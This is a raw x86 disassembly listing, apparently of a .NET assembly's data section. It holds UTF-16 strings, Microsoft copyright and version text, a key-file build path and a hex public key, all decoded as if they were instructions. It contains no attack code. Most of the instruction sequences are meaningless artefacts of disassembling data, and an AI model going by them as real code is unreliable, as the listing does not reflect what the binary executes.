  4086c5:	ins    DWORD PTR es:[edi],dx
  4086c6:	add    BYTE PTR [ebp+0x0],ah
  4086c9:	push   ebx
  4086ca:	add    BYTE PTR [eax+0x0],dh
  4086cd:	popa   
  4086ce:	add    BYTE PTR [ebx+0x0],ah
  4086d1:	add    BYTE PTR gs:[esi],dl
  4086d4:	add    BYTE PTR [di+0x0],ah
  4086d8:	outs   dx,BYTE PTR ds:[esi]
  4086d9:	add    BYTE PTR [eax+eax*1+0x61],cl
  4086dd:	add    BYTE PTR [esi+0x0],ch
  4086e0:	add    BYTE PTR [di+0x0],dh
  4086e4:	popa   
  4086e5:	add    BYTE PTR [edi+0x0],ah
  4086e8:	add    BYTE PTR gs:[ebx+eiz*2],cl
  4086ec:	add    BYTE PTR [ebx+0x0],dh
  4086ef:	dec    esp
  4086f0:	add    BYTE PTR [ecx+0x0],ah
  4086f3:	outs   dx,BYTE PTR ds:[esi]
  4086f4:	add    BYTE PTR [edi+0x0],ah
  4086f7:	or     al,0x76
  4086f9:	add    BYTE PTR [edx+0x0],ah
  4086fc:	dec    esp
  4086fd:	add    BYTE PTR [ecx+0x0],ah
  408700:	outs   dx,BYTE PTR ds:[esi]
  408701:	add    BYTE PTR [edi+0x0],ah
  408704:	or     al,0x6a
  408706:	add    BYTE PTR [ebx+0x0],dh
  408709:	dec    esp
  40870a:	add    BYTE PTR [ecx+0x0],ah
  40870d:	outs   dx,BYTE PTR ds:[esi]
  40870e:	add    BYTE PTR [edi+0x0],ah
  408711:	or     al,0x76
  408713:	add    BYTE PTR [edx+0x0],ch
  408716:	dec    esp
  408717:	add    BYTE PTR [ecx+0x0],ah
  40871a:	outs   dx,BYTE PTR ds:[esi]
  40871b:	add    BYTE PTR [edi+0x0],ah
  40871e:	or     al,0x6d
  408720:	add    BYTE PTR [ebx+0x0],ah
  408723:	dec    esp
  408724:	add    BYTE PTR [ecx+0x0],ah
  408727:	outs   dx,BYTE PTR ds:[esi]
  408728:	add    BYTE PTR [edi+0x0],ah
  40872b:	adc    BYTE PTR [esi+0x0],ah
  40872e:	imul   eax,DWORD PTR [eax],0x65006c
  408734:	push   eax
  408735:	add    BYTE PTR [ecx+0x0],ah
  408738:	je     0x40873a
  40873a:	push   0x6d0e00
  40873f:	popa   
  408740:	add    BYTE PTR [ebx+0x0],ah
  408743:	push   0x6e006900
  408748:	add    BYTE PTR [ebp+0x0],ah
  40874b:	or     BYTE PTR [ebp+0x0],dh
  40874e:	jae    0x408750
  408750:	add    BYTE PTR gs:[edx+0x0],dh
  408754:	adc    BYTE PTR [eax+0x0],dh
  408757:	popa   
  408758:	add    BYTE PTR [ebx+0x0],dh
  40875b:	jae    0x40875d
  40875d:	ja     0x40875f
  40875f:	outs   dx,DWORD PTR ds:[esi]
  408760:	add    BYTE PTR [edx+0x0],dh
  408763:	add    BYTE PTR fs:[ebx+esi*2],dl
  408767:	add    BYTE PTR [ecx+0x0],bh
  40876a:	outs   dx,BYTE PTR ds:[esi]
  40876b:	add    BYTE PTR [eax+eax*1+0x61],dh
  40876f:	add    BYTE PTR [eax+0x0],bh
  408772:	dec    eax
  408773:	add    BYTE PTR [ebp+0x0],ah
  408776:	ins    BYTE PTR es:[edi],dx
  408777:	add    BYTE PTR [eax+0x0],dh
  40877a:	push   cs
  40877b:	add    BYTE PTR gs:[eax+0x0],bh
  40877f:	popa   
  408780:	add    BYTE PTR [ebp+0x0],ch
  408783:	jo     0x408785
  408785:	ins    BYTE PTR es:[edi],dx
  408786:	add    BYTE PTR [ebp+0x0],ah
  408789:	sbb    al,0x69
  40878b:	add    BYTE PTR [esi+0x0],ch
  40878e:	jbe    0x408790
  408790:	popa   
  408791:	add    BYTE PTR [eax+eax*1+0x69],ch
  408795:	add    BYTE PTR [eax+eax*1+0x4c],ah
  408799:	add    BYTE PTR [ecx+0x0],ah
  40879c:	outs   dx,BYTE PTR ds:[esi]
  40879d:	add    BYTE PTR [edi+0x0],ah
  4087a0:	inc    ebp
  4087a1:	add    BYTE PTR [edx+0x0],dh
  4087a4:	jb     0x4087a6
  4087a6:	and    al,0x74
  4087a8:	add    BYTE PTR [edi+0x0],ch
  4087ab:	outs   dx,DWORD PTR ds:[esi]
  4087ac:	add    BYTE PTR [eax+eax*1+0x6f],cl
  4087b0:	add    BYTE PTR [esi+0x0],ch
  4087b3:	add    BYTE PTR [bp+0x0],al
  4087b7:	imul   eax,DWORD PTR [eax],0x65006c
  4087bd:	dec    esi
  4087be:	add    BYTE PTR [ecx+0x0],ah
  4087c1:	ins    DWORD PTR es:[edi],dx
  4087c2:	add    BYTE PTR [ebp+0x0],ah
  4087c5:	inc    ebp
  4087c6:	add    BYTE PTR [edx+0x0],dh
  4087c9:	jb     0x4087cb
  4087cb:	and    BYTE PTR [ecx+0x0],ch
  4087ce:	outs   dx,BYTE PTR ds:[esi]
  4087cf:	add    BYTE PTR [esi+0x0],dh
  4087d2:	popa   
  4087d3:	add    BYTE PTR [eax+eax*1+0x69],ch
  4087d7:	add    BYTE PTR [eax+eax*1+0x4e],ah
  4087db:	add    BYTE PTR [ecx+0x0],ah
  4087de:	ins    DWORD PTR es:[edi],dx
  4087df:	add    BYTE PTR [ebp+0x0],ah
  4087e2:	jae    0x4087e4
  4087e4:	jo     0x4087e6
  4087e6:	popa   
  4087e7:	add    BYTE PTR [ebx+0x0],ah
  4087ea:	add    BYTE PTR gs:[esi],cl
  4087ed:	outs   dx,DWORD PTR ds:[esi]
  4087ee:	add    BYTE PTR [eax+0x0],dh
  4087f1:	je     0x4087f3
  4087f3:	imul   eax,DWORD PTR [eax],0x6e006f
  4087f9:	jae    0x4087fb
  4087fb:	add    eax,DWORD PTR [esi]
  4087fd:	adc    ch,BYTE PTR [eax]
  4087ff:	add    al,0x0
  408801:	add    BYTE PTR [edx],dl
  408803:	sub    BYTE PTR [eax+eax*1],al
  408806:	add    BYTE PTR [edx],dl
  408808:	adc    eax,0x12000004
  40880d:	adc    DWORD PTR [esi],eax
  40880f:	add    BYTE PTR [edx],al
  408811:	push   cs
  408812:	push   cs
  408813:	sbb    eax,0x100041c
  408818:	push   cs
  408819:	push   cs
  40881a:	push   es
  40881b:	add    BYTE PTR [edx],al
  40881d:	push   cs
  40881e:	push   cs
  40881f:	adc    BYTE PTR [edx],al
  408821:	add    al,0x0
  408823:	add    DWORD PTR [esi+ecx*1],ebx
  408826:	add    al,0x8
  408828:	add    BYTE PTR [edx],dl
  40882a:	adc    eax,0x12000804
  40882f:	adc    DWORD PTR [ecx+eax*1],eax
  408832:	add    BYTE PTR [eax],al
  408834:	add    BYTE PTR [eax+eiz*1],al
  408837:	add    DWORD PTR [ecx],eax
  408839:	add    al,BYTE PTR ds:0xe010220
  40883f:	push   cs
  408840:	add    eax,0x11010120
  408845:	jne    0x40884c
  408847:	and    BYTE PTR [ecx],al
  408849:	add    DWORD PTR [ecx],edx
  40884b:	jge    0x408851
  40884d:	and    BYTE PTR [ecx],al
  40884f:	add    DWORD PTR [eax],ecx
  408851:	and    BYTE PTR [eax+0x2400],0x4
  408858:	add    BYTE PTR [eax],0x0
  40885b:	xchg   esp,eax
  40885c:	add    BYTE PTR [eax],al
  40885e:	add    BYTE PTR [esi],al
  408860:	add    al,BYTE PTR [eax]
  408862:	add    BYTE PTR [eax],al
  408864:	and    al,0x0
  408866:	add    BYTE PTR [edx+0x53],dl
  408869:	inc    ecx
  40886a:	xor    DWORD PTR [eax],eax
  40886c:	add    al,0x0
  40886e:	add    BYTE PTR [ecx],al
  408870:	add    BYTE PTR [ecx],al
  408872:	add    BYTE PTR [edi],al
  408874:	sar    edx,1
  408876:	push   edi
  408877:	les    ebp,FWORD PTR [esi+0x2ea3f0d9]
  40887d:	test   BYTE PTR [edx+0xdfdae0f],ch
  408883:	jmp    0xecab8670
  408888:	pop    DWORD PTR [edi+0x6c7603fb]
  40888e:	or     DWORD PTR [ecx+ebx*4-0x6e],0x1e
  408893:	mov    dl,0x3b
  408895:	out    0x9a,eax
  408897:	(bad)  
  408899:	fadd   st(1),st
  40889b:	fstp   QWORD PTR [edx+0x211336d2]
  4088a1:	add    dl,BYTE PTR [eax-0x6c38df5]
  4088a7:	adc    BYTE PTR [ebp+0x77e1c47f],0x10
  4088ae:	pop    esi
  4088b0:	pop    es
  4088b1:	ja     0x408902
  4088b3:	sub    eax,ebp
  4088b5:	xor    cl,BYTE PTR [esi]
  4088b7:	xchg   edx,eax
  4088b8:	jmp    0xc021:0xe8e4ec05
  4088bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088c0:	out    dx,eax
  4088c1:	call   0x4c9cedb7
  4088c6:	or     al,0x93
  4088c8:	shr    DWORD PTR [ebx+0x625d2899],0x2c
  4088cf:	stos   BYTE PTR es:[edi],al
  4088d0:	gs sub al,0x1d
  4088d3:	cli    
  4088d4:	(bad)  
  4088d5:	cmp    eax,0x2d6f5d74
  4088da:	in     eax,0xf1
  4088dc:	jle    0x40893c
  4088de:	scas   eax,DWORD PTR es:[edi]
  4088df:	pinsrw mm2,WORD PTR [esi-0x75e3d9c3],0x12
  4088e7:	inc    ebx
  4088e8:	sbb    BYTE PTR gs:[eax],ah
  4088eb:	ins    DWORD PTR es:[edi],dx
  4088ec:	rcl    BYTE PTR [ebx-0x2da5b2cc],0x93
  4088f3:	add    eax,0x80120000
  4088f8:	test   DWORD PTR ds:0x80120020,eax
  4088fe:	mov    DWORD PTR [edx],ecx
  408900:	and    BYTE PTR [ebx],al
  408902:	add    DWORD PTR [esi],ecx
  408904:	adc    al,BYTE PTR [eax-0x727fed7b]
  40890a:	push   es
  40890b:	add    BYTE PTR [ecx],al
  40890d:	adc    al,BYTE PTR [eax+0x70e91]
  408913:	add    al,0xe
  408915:	push   cs
  408916:	push   cs
  408917:	push   cs
  408918:	push   cs
  408919:	add    al,0x0
  40891b:	add    DWORD PTR [ecx],eax
  40891d:	push   cs
  40891e:	add    eax,0x80120000
  408923:	popf   
  408924:	add    al,0x20
  408926:	add    BYTE PTR [edx],dl
  408928:	adc    eax,0x2020005
  40892d:	push   cs
  40892e:	push   cs
  40892f:	push   es
  408930:	and    BYTE PTR [edx],al
  408932:	push   cs
  408933:	push   cs
  408934:	adc    dl,BYTE PTR ds:0xe012005
  40893a:	adc    dl,BYTE PTR ds:0x8002003
  408940:	add    eax,0xe010200
  408945:	sbb    al,0x7
  408947:	and    BYTE PTR [ebx],al
  408949:	add    dl,BYTE PTR [ecx]
  40894b:	sbb    DWORD PTR [esi],ecx
  40894d:	push   cs
  40894e:	push   es
  40894f:	add    BYTE PTR [ebx],al
  408951:	push   cs
  408952:	push   cs
  408953:	push   cs
  408954:	push   cs
  408955:	adc    al,BYTE PTR [edi]
  408957:	or     dl,BYTE PTR [edx]
  408959:	adc    BYTE PTR [ecx+0x110e0e0e],0x19
  408960:	adc    bl,BYTE PTR ds:0x80120802
  408966:	mov    eax,ds:0x1200408
  40896b:	or     BYTE PTR [ebx],al
  40896d:	add    eax,0x80e0220
  408972:	or     BYTE PTR [eax+eiz*1],al
  408975:	add    DWORD PTR [esi],ecx
  408977:	or     BYTE PTR ds:0xe0e0200,al
  40897d:	push   cs
  40897e:	push   es
  40897f:	pop    es
  408980:	add    al,0x2
  408982:	push   cs
  408983:	push   cs
  408984:	push   cs
  408985:	or     DWORD PTR [eax],esp
  408987:	add    al,BYTE PTR [ecx]
  408989:	adc    al,BYTE PTR [eax-0x527fed4f]
  40898f:	or     al,0x20
  408991:	add    eax,DWORD PTR [ecx]
  408993:	adc    al,BYTE PTR [eax-0x4e7fed47]
  408999:	adc    al,BYTE PTR [eax+0x22009b5]
  40899f:	add    DWORD PTR [edx],edx
  4089a1:	xor    BYTE PTR [ecx+0x5b58012],0x20
  4089a8:	add    BYTE PTR [ecx],dl
  4089aa:	add    ch,0x13
  4089ad:	pop    es
  4089ae:	pop    es
  4089af:	adc    al,BYTE PTR [eax-0x4e7fed53]
  4089b5:	add    dl,BYTE PTR [edx]
  4089b7:	xor    BYTE PTR [ebp+0x12b98012],0x80
  4089be:	rol    DWORD PTR [edx],0x5
  4089c1:	add    BYTE PTR [edx],al
  4089c3:	push   cs
  4089c4:	sbb    al,0x1c
  4089c6:	add    al,0x7
  4089c8:	add    cl,BYTE PTR [esi]
  4089ca:	add    eax,DWORD PTR [eax+eax*1]
  4089cd:	add    BYTE PTR [edx],dl
  4089cf:	and    DWORD PTR ds:0x80120020,eax
  4089d5:	rol    DWORD PTR ds:0x80120000,1
  4089db:	aad    0x5
  4089dd:	and    BYTE PTR [ecx],al
  4089df:	sbb    eax,0x20080e05
  4089e4:	add    ebx,DWORD PTR ds:0x8051d05
  4089ea:	or     BYTE PTR ds:0x80120107,al
  4089f0:	rol    DWORD PTR ds:0x1d0e0120,1
  4089f6:	add    eax,0x1012006
  4089fb:	adc    DWORD PTR [eax+0x108e1],eax
  408a01:	(bad)  
  408a02:	jg     0x408a04
  408a04:	add    BYTE PTR [eax],al
  408a06:	add    BYTE PTR ds:0x80120020,al
  408a0c:	lea    eax,ds:0x80120020
  408a12:	test   DWORD PTR [edi],eax
  408a14:	and    BYTE PTR [edx],al
  408a16:	add    DWORD PTR [esi],ecx
  408a18:	adc    al,BYTE PTR [eax+0x1100c85]
  408a1e:	add    ebx,DWORD PTR [esi]
  408a20:	add    BYTE PTR [eax],dl
  408a22:	push   ds
  408a23:	add    BYTE PTR [esi],bl
  408a25:	add    BYTE PTR [esi],bl
  408a27:	add    BYTE PTR [edx+ecx*1],al
  408a2a:	add    DWORD PTR [edx],edx
  408a2c:	sub    BYTE PTR [edi+eax*1],al
  408a2f:	add    DWORD PTR [edx],edx
  408a31:	sub    BYTE PTR [ecx],cl
  408a33:	add    BYTE PTR [ebx],al
  408a35:	push   cs
  408a36:	adc    al,BYTE PTR [eax+0x1c1d0ee9]
  408a3c:	pop    es
  408a3d:	pop    es
  408a3e:	add    al,0x12
  408a40:	sub    BYTE PTR [esi],cl
  408a42:	or     BYTE PTR [esi],cl
  408a44:	push   es
  408a45:	and    BYTE PTR [edx],al
  408a47:	sbb    al,0xe
  408a49:	adc    dl,BYTE PTR ds:0x105
  408a4f:	add    BYTE PTR [eax],al
  408a51:	add    eax,0x10001
  408a56:	add    BYTE PTR ds:0x4d100001,dl
  408a5c:	ins    DWORD PTR es:[di],dx
  408a5e:	je     0x408aa3
  408a60:	ins    BYTE PTR es:[edi],dx
  408a61:	popa   
  408a62:	jae    0x408ad7
  408a64:	inc    edi
  408a65:	outs   dx,BYTE PTR gs:[esi]
  408a67:	cs gs js 0x408ad0
  408a6b:	add    BYTE PTR [eax],al
  408a6d:	sbb    al,BYTE PTR [ecx]
  408a6f:	add    BYTE PTR ds:0x7263694d,dl
  408a75:	outs   dx,DWORD PTR ds:[esi]
  408a76:	jae    0x408ae7
  408a78:	data16 je 0x408a9b
  408a7b:	inc    ebx
  408a7c:	outs   dx,DWORD PTR ds:[esi]
  408a7d:	jb     0x408aef
  408a7f:	outs   dx,DWORD PTR ds:[esi]
  408a80:	jb     0x408ae3
  408a82:	je     0x408aed
  408a84:	outs   dx,DWORD PTR ds:[esi]
  408a85:	outs   dx,BYTE PTR ds:[esi]
  408a86:	add    BYTE PTR [eax],al
  408a88:	pop    ds
  408a89:	add    DWORD PTR [eax],eax
  408a8b:	sbb    cl,BYTE PTR [ebp+0x69]
  408a8e:	arpl   WORD PTR [edx+0x6f],si
  408a91:	jae    0x408b02
  408a93:	data16 je 0x408a58
  408a96:	scas   al,BYTE PTR es:[edi]
  408a97:	and    BYTE PTR [esi],ch
  408a99:	dec    esi
  408a9a:	inc    ebp
  408a9b:	push   esp
  408a9c:	and    BYTE PTR [esi+0x72],al
  408a9f:	popa   
  408aa0:	ins    DWORD PTR es:[edi],dx
  408aa1:	gs ja  0x408b13
  408aa4:	jb     0x408b11
  408aa6:	add    BYTE PTR [eax],al
  408aa8:	xor    al,0x1
  408aaa:	add    BYTE PTR [edi],ch
  408aac:	ret    0x20a9
  408aaf:	dec    ebp
  408ab0:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  408ab7:	je     0x408ad9
  408ab9:	inc    ebx
  408aba:	outs   dx,DWORD PTR ds:[esi]
  408abb:	jb     0x408b2d
  408abd:	outs   dx,DWORD PTR ds:[esi]
  408abe:	jb     0x408b21
  408ac0:	je     0x408b2b
  408ac2:	outs   dx,DWORD PTR ds:[esi]
  408ac3:	outs   dx,BYTE PTR ds:[esi]
  408ac4:	and    BYTE PTR cs:[eax],ah
  408ac7:	inc    ecx
  408ac8:	ins    BYTE PTR es:[edi],dx
  408ac9:	ins    BYTE PTR es:[edi],dx
  408aca:	and    BYTE PTR [edx+0x69],dh
  408acd:	addr16 push 0x72207374
  408ad3:	gs jae 0x408b3b
  408ad6:	jb     0x408b4e
  408ad8:	gs fs add BYTE PTR cs:[eax],al
  408add:	adc    al,0x1
  408adf:	add    BYTE PTR [edi],cl
  408ae1:	xor    al,0x2e
  408ae3:	xor    BYTE PTR [esi],ch
  408ae5:	xor    esi,DWORD PTR [eax]
  408ae7:	xor    esi,DWORD PTR [ecx]
  408ae9:	cmp    DWORD PTR [esi],ebp
  408aeb:	xor    DWORD PTR [edi],esi
  408aed:	cmp    DWORD PTR [edx],esi
  408aef:	cmp    DWORD PTR [eax],eax
  408af1:	add    BYTE PTR [ecx+eax*1],cl
  408af4:	add    BYTE PTR [edi],al
  408af6:	xor    al,0x2e
  408af8:	xor    BYTE PTR [esi],ch
  408afa:	xor    BYTE PTR [esi],ch
  408afc:	xor    BYTE PTR [eax],al
  408afe:	add    BYTE PTR [edx],cl
  408b00:	add    DWORD PTR [eax],eax
  408b02:	add    eax,0x552d6e65
  408b07:	push   ebx
  408b08:	add    BYTE PTR [eax],al
  408b0a:	sub    al,BYTE PTR [ecx]
  408b0c:	add    BYTE PTR ds:0x645c3a66,ah
  408b12:	fs pop esp
  408b14:	je     0x408b85
  408b16:	outs   dx,DWORD PTR ds:[esi]
  408b17:	ins    BYTE PTR es:[edi],dx
  408b18:	jae    0x408b76
  408b1a:	fs gs jbe 0x408b82
  408b1e:	imul   esi,DWORD PTR [esi+0x5c],0x616e6946
  408b25:	ins    BYTE PTR es:[edi],dx
  408b26:	push   eax
  408b27:	jne    0x408b8b
  408b29:	ins    BYTE PTR es:[edi],dx
  408b2a:	imul   esp,DWORD PTR [ebx+0x4b],0x732e7965
  408b31:	outs   dx,BYTE PTR ds:[esi]
  408b32:	imul   eax,DWORD PTR [eax],0x0
  408b35:	or     DWORD PTR [eax+0x1],0x0
  408b39:	add    BYTE PTR [eax+0x30],0x30
  408b3d:	xor    dh,BYTE PTR [eax+esi*1]
  408b40:	xor    BYTE PTR [eax],dh
  408b42:	xor    BYTE PTR [eax],dh
  408b44:	arpl   WORD PTR [eax],di
  408b46:	xor    BYTE PTR [eax],dh
  408b48:	xor    BYTE PTR [eax],dh
  408b4a:	xor    BYTE PTR [ecx],dh
  408b4c:	xor    al,0x30
  408b4e:	xor    DWORD PTR [eax],esi
  408b50:	xor    BYTE PTR [eax],dh
  408b52:	xor    BYTE PTR [eax],dh
  408b54:	xor    BYTE PTR ss:[edx],dh
  408b57:	xor    BYTE PTR [eax],dh
  408b59:	xor    BYTE PTR [eax],dh
  408b5b:	xor    BYTE PTR [eax],dh
  408b5d:	xor    dh,BYTE PTR [eax+esi*1]
  408b60:	xor    BYTE PTR [eax],dh
  408b62:	xor    BYTE PTR ds:0x34333532,dh
  408b68:	xor    DWORD PTR [ebx],esi
  408b6a:	xor    DWORD PTR [eax],esi
  408b6c:	xor    BYTE PTR [eax],dh
  408b6e:	cmp    BYTE PTR [eax],dh
  408b70:	xor    BYTE PTR [eax],dh
  408b72:	xor    BYTE PTR [eax],dh
  408b74:	xor    DWORD PTR [eax],esi
  408b76:	xor    BYTE PTR [eax],dh
  408b78:	xor    DWORD PTR [eax],esi
  408b7a:	xor    BYTE PTR [esi],dh
  408b7c:	xor    DWORD PTR [ebx],esi
  408b7e:	xor    edi,DWORD PTR [ecx]
  408b80:	cmp    DWORD PTR [ecx+0x66],esp
  408b83:	xor    WORD PTR [eax],di
  408b86:	xor    WORD PTR gs:[ecx+0x32],sp
  408b8b:	arpl   WORD PTR [edx],si
  408b8d:	xor    eax,0x32613431
  408b92:	aaa    
  408b93:	xor    esp,DWORD PTR [ecx+0x34]
  408b96:	xor    ah,BYTE PTR [ecx+edi*1+0x30]
  408b9a:	xor    al,0x32
  408b9c:	bound  esi,QWORD PTR [edi]
  408b9e:	xor    dh,BYTE PTR [ebx]
  408ba0:	xor    dh,BYTE PTR [ecx]
  408ba2:	xor    WORD PTR [edi],si
  408ba5:	xor    eax,0x32303137
  408baa:	cmp    WORD PTR fs:[ebp+0x62],sp
  408baf:	popa   
  408bb0:	fs popa 
  408bb2:	cmp    DWORD PTR ss:[ecx],edi
  408bb5:	xor    dh,BYTE PTR [ebx]
  408bb7:	xor    dh,BYTE PTR gs:[edi]
  408bba:	xor    edi,DWORD PTR [eax]
  408bbc:	xor    al,0x30
  408bbe:	arpl   WORD PTR ss:[edx],si
  408bc1:	xor    DWORD PTR [ebp+0x35],esp
  408bc4:	bound  edi,QWORD PTR [eax]
  408bc6:	xor    BYTE PTR [ecx],dh
  408bc8:	xor    eax,0x62613235
  408bcd:	cmp    BYTE PTR [edx+esi*1+0x30],ah
  408bd1:	xor    BYTE PTR [ecx+0x36],ah
  408bd4:	xor    eax,0x35333261
  408bd9:	xor    BYTE PTR gs:[eax],dh
  408bdc:	xor    DWORD PTR [ecx+0x63],esp
  408bdf:	cmp    DWORD PTR [ecx+0x64],esp
  408be2:	arpl   WORD PTR [edx],si
  408be4:	xor    eax,0x38643266
  408be9:	xor    DWORD PTR [ecx],esi
  408beb:	bound  esi,QWORD PTR gs:[eax]
  408bee:	cmp    DWORD PTR [ecx+edi*1],esi
  408bf1:	ss popa 
  408bf3:	xor    al,0x63
  408bf5:	ss popa 
  408bf7:	xor    eax,0x36346439
  408bfc:	xor    DWORD PTR [ecx],edi
  408bfe:	xor    eax,0x36633938
  408c03:	cmp    DWORD PTR [esi+0x35],esp
  408c06:	bound  esp,QWORD PTR [ecx+0x66]
  408c09:	xor    BYTE PTR [ebx+0x34],ah
  408c0c:	xor    DWORD PTR [edi],esi
  408c0e:	cmp    DWORD PTR [ecx+0x34],esp
  408c11:	aaa    
  408c12:	xor    esi,DWORD PTR [ecx]
  408c14:	xor    DWORD PTR [ecx+edi*1+0x32],esp
  408c18:	xor    eax,0x64633535
  408c1d:	xor    BYTE PTR [eax],dh
  408c1f:	ss popa 
  408c21:	arpl   WORD PTR [ebx+0x38],sp
  408c24:	bound  esi,QWORD PTR ds:0x66393539
  408c2a:	xor    ah,BYTE PTR [edx+0x64]
  408c2d:	ss xor DWORD PTR gs:[eax],esi
  408c31:	xor    esi,DWORD PTR gs:[esi]
  408c34:	xor    BYTE PTR [ebx+0x33],ah
  408c37:	xor    al,0x35
  408c39:	xor    esi,DWORD PTR [edi]
  408c3b:	popa   
  408c3c:	xor    DWORD PTR [edx+esi*1+0x36],esp
  408c40:	ss fs popa 
  408c43:	cmp    BYTE PTR [eax],dh
  408c45:	cmp    BYTE PTR ds:0x35363538,dh
  408c4b:	cmp    BYTE PTR [ebx],dh
  408c4d:	arpl   WORD PTR [eax],di
  408c4f:	xor    eax,0x64313864
  408c54:	popa   
  408c55:	aaa    
  408c56:	xor    sp,WORD PTR [ebp+0x63]
  408c5a:	xor    BYTE PTR [ecx],dh
  408c5c:	gs cmp DWORD PTR fs:0x35633436,esi
  408c64:	cmp    BYTE PTR [ecx+edi*1+0x33],ah
  408c68:	fs aaa 
  408c6a:	xor    DWORD PTR [ebx],esi
  408c6c:	arpl   WORD PTR [eax+esi*1+0x31],sp
  408c70:	aaa    
  408c71:	xor    ah,BYTE PTR [ebx+0x38]
  408c74:	xor    dh,BYTE PTR gs:[ebx]
  408c77:	popa   
  408c78:	xor    DWORD PTR [eax],esi
  408c7a:	data16 xor BYTE PTR [edx],dh
  408c7d:	xor    edi,DWORD PTR [ecx]
  408c7f:	bound  edi,QWORD PTR [eax]
  408c81:	xor    BYTE PTR [ebx+0x39],ah
  408c84:	bound  esi,QWORD PTR ss:[eax]
  408c87:	aaa    
  408c88:	aaa    
  408c89:	xor    esi,DWORD PTR [esi]
  408c8b:	xor    ax,0x3864
  408c8f:	bound  esi,QWORD PTR [eax]
  408c91:	xor    dh,BYTE PTR [edx]
  408c93:	xor    eax,0x34613234
  408c98:	gs aaa 
  408c9a:	xor    al,0x32
  408c9c:	xor    eax,0x66356131
  408ca1:	xor    al,0x33
  408ca3:	xor    bh,BYTE PTR [eax]
  408ca5:	xor    dh,BYTE PTR [ebx+esi*1]
  408ca8:	xor    DWORD PTR [eax],edi
  408caa:	bound  esi,QWORD PTR [ebx]
  408cac:	xor    eax,0x35613933
  408cb1:	popa   
  408cb2:	xor    BYTE PTR [eax],bh
  408cb4:	aaa    
  408cb5:	data16 cmp BYTE PTR [ebp+0x35],ah
  408cb9:	xor    esp,DWORD PTR [edx+esi*1+0x66]
  408cbd:	xor    DWORD PTR [ebx],esi
  408cbf:	xor    eax,0x61633966
  408cc4:	xor    al,0x37
  408cc6:	xor    sp,WORD PTR [edx+0x62]
  408cca:	xor    ah,BYTE PTR [ebp+0x31]
  408ccd:	xor    BYTE PTR [ecx+0x66],ah
  408cd0:	data16 xor BYTE PTR [ecx+0x66],ah
  408cd4:	xor    BYTE PTR [eax],bh
  408cd6:	xor    al,0x39
  408cd8:	xor    eax,0x62663430
  408cdd:	aaa    
  408cde:	arpl   WORD PTR [ebp+0x61],sp
  408ce1:	xor    esp,DWORD PTR [esi+0x66]
  408ce4:	xor    DWORD PTR [ecx],edi
  408ce6:	xor    ah,BYTE PTR [ebx+eiz*2+0x38]
  408cea:	fs xor BYTE PTR gs:[ebp+0x64],ah
  408cef:	popa   
  408cf0:	fs ss xor al,0x63
  408cf4:	cmp    BYTE PTR ss:[ebp+0x66],ah
  408cf8:	fs xor esi,DWORD PTR gs:[ebx+eiz*2]
  408cfd:	xor    eax,0x30336436
  408d02:	xor    ah,BYTE PTR [ecx+0x64]
  408d05:	xor    eax,0x36646635
  408d0a:	cmp    BYTE PTR gs:[eax],dh
  408d0d:	xor    si,WORD PTR [eax]
  408d10:	xor    ah,BYTE PTR [ebp+esi*1+0x65]
  408d14:	data16 arpl WORD PTR [ebp+eiz*2+0x61],sp
  408d19:	cmp    DWORD PTR gs:0x38353633,esi
  408d20:	xor    esi,DWORD PTR fs:[esi*1+0x31363532]
  408d28:	bound  esi,QWORD PTR ds:0x63363366
  408d2e:	xor    eax,0x66653234
  408d33:	bound  esp,QWORD PTR fs:[esp+eiz*2+0x39]
  408d38:	data16 cmp BYTE PTR [eax],bh
  408d3b:	cmp    BYTE PTR ds:0x33643833,dh
  408d41:	aaa    
  408d42:	xor    al,0x63
  408d44:	xor    WORD PTR gs:[eax],si
  408d48:	ss popa 
  408d4a:	arpl   WORD PTR [esi+0x37],sp
  408d4d:	cmp    DWORD PTR fs:[ebx],esi
  408d50:	popa   
  408d51:	xor    al,0x34
  408d53:	xor    al,0x35
  408d55:	arpl   WORD PTR [ebx],si
  408d57:	arpl   WORD PTR [edi],si
  408d59:	xor    esp,DWORD PTR [ebx+0x64]
  408d5c:	cmp    DWORD PTR [ecx],esi
  408d5e:	xor    DWORD PTR [esi+0x30],esp
  408d61:	xor    eax,0x61613137
  408d66:	xor    sp,WORD PTR [ebp+esi*1+0x34]
  408d6b:	fs popa 
  408d6d:	xor    DWORD PTR [edx],esi
  408d6f:	bound  esi,QWORD PTR [ecx]
  408d71:	xor    DWORD PTR [esp+eiz*2+0x65],esp
  408d75:	arpl   WORD PTR [ebx],si
  408d77:	aaa    
  408d78:	xor    eax,0x813362
  408d7d:	popa   
  408d7e:	xor    eax,0x36363861
  408d83:	xor    DWORD PTR gs:[ebp+0x65],esp
  408d87:	xor    DWORD PTR [eax],edi
  408d89:	data16 cmp BYTE PTR ss:[eax],dh
  408d8d:	aaa    
  408d8e:	ss cmp BYTE PTR ss:[edx],dh
  408d92:	xor    BYTE PTR [ecx],bh
  408d94:	xor    sp,WORD PTR [edx+0x31]
  408d98:	xor    DWORD PTR [edx],esi
  408d9a:	xor    esi,DWORD PTR [esi]
  408d9c:	popa   
  408d9d:	arpl   WORD PTR [ebp+0x35],sp
  408da0:	xor    dh,BYTE PTR gs:[ecx]
  408da3:	xor    WORD PTR [ecx],si
  408da6:	aaa    
  408da7:	cmp    BYTE PTR [eax],dh
  408da9:	xor    esp,DWORD PTR [ecx+0x33]
  408dac:	xor    DWORD PTR [ebx+esi*1],esi
  408daf:	popa   
  408db0:	bound  esp,QWORD PTR [edx+0x31]
  408db3:	xor    dh,BYTE PTR [esi]
  408db5:	fs xor BYTE PTR fs:[ebx],dh
  408db9:	xor    eax,0x32643764
  408dbe:	data16 cmp BYTE PTR [edi],dh
  408dc1:	bound  esi,QWORD PTR ss:[esi]
  408dc4:	cmp    DWORD PTR [ebx],esi
  408dc6:	cmp    BYTE PTR [ecx+0x61],ah
  408dc9:	data16 xor ah,BYTE PTR [ebp+0x65]
  408dcd:	xor    esi,DWORD PTR [ecx+esi*1]
  408dd0:	xor    al,0x64
  408dd2:	xor    eax,0x64303234
  408dd7:	aaa    
  408dd8:	xor    eax,0x31323633
  408ddd:	xor    al,0x30
  408ddf:	xor    BYTE PTR [edx+eiz*2+0x34],ah
  408de3:	xor    al,0x61
  408de5:	xor    al,0x39
  408de7:	arpl   WORD PTR [eax+edi*1],si
  408dea:	arpl   WORD PTR ss:[ebp+0x31],sp
  408dee:	xor    esi,DWORD PTR [ebx+esi*1]
  408df1:	xor    BYTE PTR [eax],dh
